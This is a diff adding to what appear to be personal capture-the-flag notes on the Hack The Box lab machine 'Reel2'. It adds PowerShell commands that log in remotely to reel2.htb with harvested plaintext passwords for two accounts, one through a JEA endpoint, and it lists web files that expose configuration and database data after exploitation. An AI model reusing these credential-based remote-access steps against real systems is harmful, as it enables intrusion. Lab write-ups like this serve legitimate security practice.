@@ -18,3 +18,22 @@ Access/Exploit:
 - mail phishing work
 -- it sending a post request in specific time.
 
+$user='htb\k.svensson'
+$password = ConvertTo-SecureString 'kittycat1' -AsPlainText -Force
+$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $user, $password
+Enter-PSSession -Computer reel2.htb -Credential $cred -Authentication Negotiate
+
+$user='htb\jea_test_account'
+$password = ConvertTo-SecureString 'Ab!Q@vcg^%@#1' -AsPlainText -Force
+$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $user, $password
+Enter-PSSession -Credential $cred -ConfigurationName jea_test_account -Computer reel2.htb -Authentication Negotiate
+
+
+Post exploit:
+- Web
+-- Information disclosure: C:\xampp\htdocs\social\search.php
+--- C:\xampp\htdocs\social\_database\wallstant.sql
+--- C:\xampp\htdocs\social\config\connect.php
+
+
+
